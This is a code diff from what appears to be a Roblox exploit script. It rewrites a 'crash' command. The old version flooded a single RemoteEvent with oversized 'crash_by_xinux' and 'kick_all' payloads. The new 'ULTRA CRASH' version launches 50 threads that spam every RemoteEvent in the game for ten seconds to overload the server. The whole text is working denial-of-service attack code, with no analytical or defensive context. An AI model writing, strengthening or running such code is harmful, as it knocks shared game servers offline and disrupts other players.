@@ -473,57 +473,41 @@ return {
     crash = {
         action = function(args)
             if activeLoops.crash then
-                return "ERROR|Crash sequence is already running!"
+                return "ERROR|Crash already running!"
             end
             
-            local targetRemote = nil
+            local targets = {}
             for _, v in ipairs(game:GetDescendants()) do
                 if v:IsA("RemoteEvent") then
-                    targetRemote = v
-                    break
+                    table.insert(targets, v)
                 end
             end
             
-            if not targetRemote then
-                return "ERROR|No RemoteEvent found to target."
-            end
+            if #targets == 0 then return "ERROR|No RemoteEvents found." end
             
             activeLoops.crash = true
             local sentCount = 0
-            local kickWarning = false
             
-            task.spawn(function()
-                game:GetService("Players").LocalPlayer.OnTeleport:Connect(function()
-                    activeLoops.crash = false
-                    kickWarning = true
+            for i = 1, 50 do
+                task.spawn(function()
+                    while activeLoops.crash do
+                        for _, remote in ipairs(targets) do
+                            if not activeLoops.crash then break end
+                            pcall(function()
+                                remote:FireServer("lag")
+                            end)
+                            sentCount = sentCount + 1
+                        end
+                        task.wait()
+                    end
                 end)
+            end
+            
+            task.delay(10, function()
+                activeLoops.crash = false
             end)
             
-            task.spawn(function()
-                while activeLoops.crash and sentCount < 5000 do
-                    if kickWarning then break end
-                    
-                    if not targetRemote:IsDescendantOf(game) then
-                        break
-                    end
-
-                    pcall(function()
-                        targetRemote:FireServer("crash_by_xinux", string.rep("A", 10000))
-                        targetRemote:FireServer("kick_all")
-                        targetRemote:FireServer("ping")
-                    end)
-                    
-                    sentCount = sentCount + 1
-                    
-                    if sentCount % 100 == 0 then
-                        task.wait(0.1)
-                    else
-                        task.wait() 
-                    end
-                end
-            end)
-            
-            return "SUCCESS|Crash sequence started. Sent " .. sentCount .. " requests before stopping. Check if server is still alive."
+            return "SUCCESS|ULTRA CRASH started (50 threads). Auto-stops in 10s. Sent: " .. sentCount
         end
     },
     stp = {
